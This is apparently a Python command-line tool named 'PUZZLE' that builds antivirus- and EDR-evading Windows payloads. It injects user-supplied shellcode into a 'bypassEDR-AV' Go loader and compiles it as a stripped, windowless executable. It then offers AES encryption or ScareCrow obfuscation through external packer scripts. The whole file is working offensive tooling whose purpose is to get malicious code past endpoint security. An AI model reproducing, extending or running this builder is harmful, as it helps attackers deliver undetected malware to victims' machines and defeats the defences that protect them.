import questionary
import datetime
import re
import sys
import subprocess
import os
from questionary import Style

def process_shellcode_and_update_manifest(shellcode_file, manifest_path):
    """
    Reads a shellcode binary file, converts it to a continuous hex string, and replaces 
    the placeholder in the manifest file with the formatted shellcode.
    """
    try:
        # Read the shellcode file as binary
        with open(shellcode_file, 'rb') as f:
            content = f.read()
        
        # Convert binary content to a continuous hex string
        formatted_shellcode = content.hex()
        print(f"Extracted shellcode: {formatted_shellcode[:50]}...")  # Print first 50 characters for verification

        # Read the manifest file
        with open(manifest_path, 'r') as f:
            manifest_content = f.read()

        # Replace the placeholder in the manifest file
        updated_manifest_content = re.sub(
            r"#!.*\$!", 
            f"#!{formatted_shellcode}$!", 
            manifest_content, 
            flags=re.DOTALL  # Allow multiline matching
        )

        # Write the updated content back to the manifest file
        with open(manifest_path, 'w') as f:
            f.write(updated_manifest_content)

        print("Manifest updated successfully.")

        # Update go.mod from version 1.23.0 to just 1.23
        result = subprocess.run('''sed -i 's/^go [0-9]\+\.[0-9]\+\(\.[0-9]\+\)*$/go 1.23/' /app/bypassEDR-AV/go.mod''', shell=True, cwd="/app/bypassEDR-AV", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        # Update the RSC
        result = subprocess.run('''GOOS=windows GOARCH=amd64 /usr/bin/go build -ldflags="-H=windowsgui -s -w"''', shell=True, cwd="/app/bypassEDR-AV", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        # Rename the Payload
        print("\033[32m[+] Checking if payload has been created:\033[0m")
        # Ensuring payload was created 
        result = subprocess.run("ls -lah /app/bypassEDR-AV/edr.exe", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        print(result.stdout)
        # Move the payload to the mounted payloads directory
# Generate the new filename with the current date
        current_date = datetime.datetime.now().strftime("%Y-%m-%d")
        new_filename = f"payload_{current_date}_packed_no-sig_x64.exe"
        try:
            move_command = f"mv /app/bypassEDR-AV/edr.exe /app/payloads/{new_filename}"
            result = subprocess.run(move_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
            print("\033[32m[+] Payload moved to /app/payloads/ successfully.\033[0m")
            print(result.stdout)
        except subprocess.CalledProcessError as e:
            print("\033[31m[-] Failed to move payload to /app/payloads/. Error:\033[0m")
            print(e.stderr)

    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

def exe():
    # Display Choices for Encryption Type
    choice = questionary.select(
        "Select EXE Payload Encryption Type:",
        choices=["AES", "NULL", "Exit"],
        style=custom_style
    ).ask()
    if choice == "AES":
        aes()

def aes():
    # Define the directory
    directory = "/app/payloads"

    # Check if the directory exists
    if not os.path.exists(directory):
        print(f"Directory '{directory}' does not exist.")
        return

    # Display all files in the directory
    files = [file for file in os.listdir(directory) if os.path.isfile(os.path.join(directory, file))]

    # Check if there are files in the directory
    if not files:
        print("No files found in the directory.")
        return

    # Use Questionary to let the user select a file
    selected_file = questionary.select(
        "Select a file:",
        choices=files
    ).ask()

    # Store the user's choice in a variable
    if selected_file:
        selected_file_path = os.path.join(directory, selected_file)
        print(f"Payload selected: {selected_file_path}")
        # Run the Packer Script against the payload
        command = f"python Shellcode-Hide/3\\ -\\ Encrypting/1\\ -\\ AES/AES_cryptor.py {selected_file_path}"
        #command = "ls -lah"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        # Print output
        print(result.stdout)

def shellcode():
    print("Shellcode option selected.")
    # Use an absolute path for payloads
    payloads_dir = "/app/payloads"

    # Check if the payloads directory exists
    if not os.path.exists(payloads_dir):
        print(f"Error: Directory '{payloads_dir}' does not exist.")
        return

    # List files in the payloads directory
    files = [f for f in os.listdir(payloads_dir) if os.path.isfile(os.path.join(payloads_dir, f))]
    if not files:
        print(f"No files found in the directory: {payloads_dir}")
        return

    print(f"Files in payloads directory: {files}")
    selected_file = questionary.select(
        "Select a file:",
        choices=files
    ).ask()

    if selected_file:
        selected_file_path = os.path.join(payloads_dir, selected_file)
        print(f"Payload selected: {selected_file_path}")

    # Validate file existence
    if not os.path.isfile(selected_file_path):
        print(f"Error: File '{selected_file_path}' does not exist.")
        return

    # Proceed with shellcode obfuscation
    choice = questionary.select(
        "Shellcode Obfuscation Technique:",
        choices=["AVBypass Manifest", "ScareCrow", "Exit"],
        style=custom_style
    ).ask()

    if choice == "AVBypass Manifest":
        print("Using AVBypass Manifest.")
        # Ensure manifest path exists
        manifest_path = "/app/bypassEDR-AV/manifiesto.txt"
        if not os.path.isfile(manifest_path):
            print(f"Error: Manifest file '{manifest_path}' does not exist.")
            return

        process_shellcode_and_update_manifest(
            shellcode_file=selected_file_path,
            manifest_path=manifest_path
        )


ascii_art = r"""
+-------------------------------------------------------------+
|                                                             |
|   __________ ____ _______________________.____ ___________  |
|   \______   \    |   \____    /\____    /|    |\_   _____/  |
|    |     ___/    |   / /     /   /     / |    | |    __)_   |
|    |    |   |    |  / /     /_  /     /_ |    | |        \  |
|    |____|   |______/ /_______ \/_______ \|____|/_______  /  |
|                          \/        \/        \/          \/ |
|                                                             |
|                        PUZZLE                               |
+-------------------------------------------------------------+
"""

print(f"\033[35m{ascii_art}\033[0m")

custom_style = Style([("choice", "fg:blue")])  # Choices will appear in blue

choice = questionary.select(
    "Payload Type:",
    choices=["EXE", "Shellcode", "Exit"],
    style=custom_style
).ask()

if choice == "EXE":
    print("Creating EXE from Shellcode...")
    exe()
elif choice == "Shellcode":
    print("Creating Shellcode...")
    shellcode()
elif choice == "Exit":
    print("Exiting the program. Goodbye!")
